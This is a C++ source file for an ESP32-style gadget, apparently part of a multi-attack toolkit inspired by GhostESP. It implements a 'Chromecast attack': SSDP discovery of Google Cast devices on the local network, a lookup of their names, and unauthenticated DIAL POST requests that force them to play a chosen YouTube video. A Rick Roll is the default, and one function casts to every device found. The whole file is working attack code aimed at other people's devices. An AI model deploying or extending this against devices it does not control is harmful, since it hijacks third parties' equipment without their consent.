#include "chromecast_attack.h"
#include <HTTPClient.h>
#include <ArduinoJson.h>

// Chromecast Attack — discovers Google Cast devices on the local network
// and sends them cast commands to play a custom URL.
// Based on DIAL protocol and Google Cast REST API (port 8008/8009)
// Inspired by GhostESP DIAL/Chromecast support

// Rick Roll YouTube URL for the rickroll cast
static const char* RICK_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

// SSDP discovery message for Google Cast devices
static const char* SSDP_MSG =
  "M-SEARCH * HTTP/1.1\r\n"
  "HOST: 239.255.255.250:1900\r\n"
  "MAN: \"ssdp:discover\"\r\n"
  "MX: 3\r\n"
  "ST: urn:dial-multiscreen-org:service:dial:1\r\n"
  "\r\n";

void ChromecastAttack::begin() { _running=false; _count=0; }

int ChromecastAttack::discoverSSDP() {
  _count=0;
  _udp.begin(1900);

  // Send SSDP M-SEARCH broadcast
  IPAddress mcast(239,255,255,250);
  _udp.beginPacket(mcast, 1900);
  _udp.print(SSDP_MSG);
  _udp.endPacket();

  Serial.println("Chromecast: sent SSDP discovery...");

  uint32_t t = millis();
  char buf[512];

  while(millis()-t < 3000 && _count < MAX_CHROMECASTS) {
    int len = _udp.parsePacket();
    if(len > 0){
      len = min(len, (int)sizeof(buf)-1);
      _udp.read(buf, len);
      buf[len]='\0';

      String resp(buf);
      // Check if it's a Cast device response
      if(resp.indexOf("dial-multiscreen")>=0 || resp.indexOf("Chromecast")>=0
         || resp.indexOf("Google")>=0){

        String ip = _udp.remoteIP().toString();

        // Don't add duplicates
        bool dup=false;
        for(int i=0;i<_count;i++) if(_devices[i].ip==ip){dup=true;break;}
        if(dup) continue;

        ChromecastDevice dev;
        dev.ip   = ip;
        dev.port = 8008;
        dev.name = "Chromecast @ " + ip;

        // Try to get friendly name via DIAL REST API
        HTTPClient http;
        String infoUrl = "http://" + ip + ":8008/setup/eureka_info";
        if(http.begin(infoUrl)){
          http.setTimeout(1000);
          int code = http.GET();
          if(code==200){
            String body = http.getString();
            DynamicJsonDocument doc(512);
            if(deserializeJson(doc,body)==DeserializationError::Ok){
              if(doc.containsKey("name"))
                dev.name = doc["name"].as<String>();
            }
          }
          http.end();
        }

        _devices[_count++] = dev;
        Serial.printf("Chromecast: found '%s' at %s\n", dev.name.c_str(), ip.c_str());
      }
    }
    delay(10);
  }
  _udp.stop();
  Serial.printf("Chromecast: discovery done — %d devices\n", _count);
  return _count;
}

int ChromecastAttack::scan() {
  Serial.println("Chromecast: scanning network...");
  return discoverSSDP();
}

bool ChromecastAttack::sendCastCommand(const String& ip, int port, const String& url) {
  // Use the DIAL REST API to launch YouTube on the Chromecast
  // POST to /apps/YouTube with the video ID
  HTTPClient http;

  // Extract video ID if YouTube URL
  String videoId = "";
  int vIdx = url.indexOf("v=");
  if(vIdx >= 0){
    videoId = url.substring(vIdx+2);
    int ampIdx = videoId.indexOf('&');
    if(ampIdx >= 0) videoId = videoId.substring(0, ampIdx);
  }

  String dialUrl = "http://" + ip + ":" + String(port) + "/apps/YouTube";
  String body = videoId.isEmpty() ? "v=dQw4w9WgXcQ" : "v=" + videoId;

  if(!http.begin(dialUrl)) return false;
  http.addHeader("Content-Type","text/plain");
  http.setTimeout(3000);
  int code = http.POST(body);
  http.end();

  if(code==201 || code==200){
    Serial.printf("Chromecast: cast to %s OK (HTTP %d)\n", ip.c_str(), code);
    return true;
  }
  Serial.printf("Chromecast: cast to %s FAILED (HTTP %d)\n", ip.c_str(), code);
  return false;
}

bool ChromecastAttack::cast(int idx, const String& url) {
  if(idx<0||idx>=_count) return false;
  _running=true;
  bool ok = sendCastCommand(_devices[idx].ip, _devices[idx].port, url);
  _running=false;
  return ok;
}

bool ChromecastAttack::castRickRoll(int idx) {
  Serial.printf("Chromecast: Rick Rolling '%s'\n",
                idx<_count?_devices[idx].name.c_str():"all");
  return cast(idx, RICK_URL);
}

bool ChromecastAttack::castAll(const String& url) {
  bool any=false;
  for(int i=0;i<_count;i++){
    if(sendCastCommand(_devices[i].ip, _devices[i].port, url)) any=true;
    delay(200);
  }
  return any;
}

void ChromecastAttack::stop() { _running=false; }
